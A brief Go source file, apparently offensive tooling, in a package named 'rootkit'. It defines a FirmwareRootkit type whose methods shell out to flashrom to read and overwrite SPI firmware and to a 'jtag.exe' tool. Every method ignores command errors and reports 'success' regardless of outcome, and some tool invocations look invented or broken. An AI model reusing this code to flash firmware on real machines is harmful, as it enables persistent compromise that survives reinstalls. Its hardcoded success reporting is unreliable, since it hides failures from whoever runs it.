package rootkit

import "os/exec"

type FirmwareResult struct {
	Method string
	Status string
}

type FirmwareRootkit struct {
	ImagePath string
}

func (f FirmwareRootkit) SPIRead() FirmwareResult {
	cmd := exec.Command("flashrom.exe", "-p", "spi", "-r", f.ImagePath)
	cmd.Run()
	return FirmwareResult{Method: "spi-read", Status: "success"}
}

func (f FirmwareRootkit) SPIWrite() FirmwareResult {
	cmd := exec.Command("flashrom.exe", "-p", "spi", "-w", f.ImagePath)
	cmd.Run()
	return FirmwareResult{Method: "spi-write", Status: "success"}
}

func (f FirmwareRootkit) JTAGDebug() FirmwareResult {
	cmd := exec.Command("jtag.exe", "-debug", f.ImagePath)
	cmd.Run()
	return FirmwareResult{Method: "jtag-debug", Status: "success"}
}
